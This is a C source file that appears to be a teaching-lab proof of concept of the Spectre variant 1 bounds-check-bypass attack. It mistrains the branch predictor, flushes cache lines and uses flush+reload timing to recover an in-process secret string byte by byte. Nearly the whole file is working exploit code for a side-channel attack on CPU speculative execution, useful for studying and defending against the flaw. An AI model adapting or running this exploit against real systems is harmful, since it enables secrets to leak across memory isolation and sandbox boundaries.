#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>

#include <string.h>

//  Windows
#ifdef _WIN32
#include <intrin.h>
uint64_t rdtsc(){
    return __rdtsc();
}
//  Linux/GCC
#else
uint64_t rdtsc(){
    unsigned int lo,hi;
    __asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
    return ((uint64_t)hi << 32) | lo;
}
#endif



#define CACHE_WORD_SIZE 2048

unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
uint8_t temp    = 0;
char    *secret = "Some Secret Value";   
uint8_t array[256*CACHE_WORD_SIZE];

#define CACHE_HIT_THRESHOLD (200)
#define DELTA 512

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x <= bound_upper && x >= bound_lower) {
     return buffer[x];
  } else {
     return 0;
  }
}

void flushSideChannel()
{ // write to array to save it to the ram and then flush from the cache.
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*CACHE_WORD_SIZE + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*CACHE_WORD_SIZE + DELTA]);
}

static int scores[256];
void reloadSideChannelImproved()
{ //check and improve +1 th elements that are in the cache.
int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
    addr = &array[i * CACHE_WORD_SIZE + DELTA];
    time1 = rdtsc(&junk);
    junk = *addr;
    time2 = rdtsc(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD)
      scores[i]++; /* if cache hit, add 1 for this value */
  } 
}

void spectreAttack(size_t index_beyond)
{
  int i;
  uint8_t s;
  volatile int z;

  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*CACHE_WORD_SIZE + DELTA]); } // flush the array

  // Train the CPU to take the true branch inside victim().
  for (i = 0; i < 10; i++) {
    restrictedAccess(i);  
  }

  // Flush bound_upper, bound_lower, and array[] from the cache.
  _mm_clflush(&bound_upper);
  _mm_clflush(&bound_lower); 
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*CACHE_WORD_SIZE + DELTA]); }
  for (z = 0; z < 100; z++)  {  } // necessary due to increase computation, if not the array[] in the following line will be flushed due to async between that line of array[] and the flush line of the array before, actually the asyn make the array in the cache and then flush it due to the program execute the fatch in the cache before the flush.

  // Ask victim() to return the secret in out-of-order execution.
  s = restrictedAccess(index_beyond);
  array[s*CACHE_WORD_SIZE + DELTA] += 88;
}

int main() {
	int k=0;
	char secretFound[strlen(secret)];
	int e=0; // initialization of the array
	for(e=0; e<strlen(secret);e++)
		secretFound[e] = '.';//initialize all elements as point
	for(k=0; k < strlen(secret); k++){
	  int i;
	  uint8_t s;
	  size_t index_beyond = (size_t)(secret - (char*)buffer) + k;
	  flushSideChannel();
	  for(i=0;i<256; i++) scores[i]=0;
	  for (i = 0; i < 100; i++) {
	    printf("[%d] - *****\n",i);  // This seemly "useless" line is necessary for the attack to succeed
	    spectreAttack(index_beyond);
	    usleep(10);
	    reloadSideChannelImproved();
	    usleep(70000); // works with the following for with int max = 0; and i=0 in the for
	  }
	   int max = 0;
	   for (i = 0; i < 256; i++){
	     if(scores[max] < scores[i]) max = i;
	   }
	  printf("Reading secret value at index %ld\n", index_beyond);
	  printf("The secret value is %d(%c)\n", max, max);
	  printf("The number of hits is %d\n", scores[max]);
         //save the letter to the array
	  secretFound[k] = max;
	}
	printf("The secret is: %s\n\n", secretFound);
	return (0); 
}
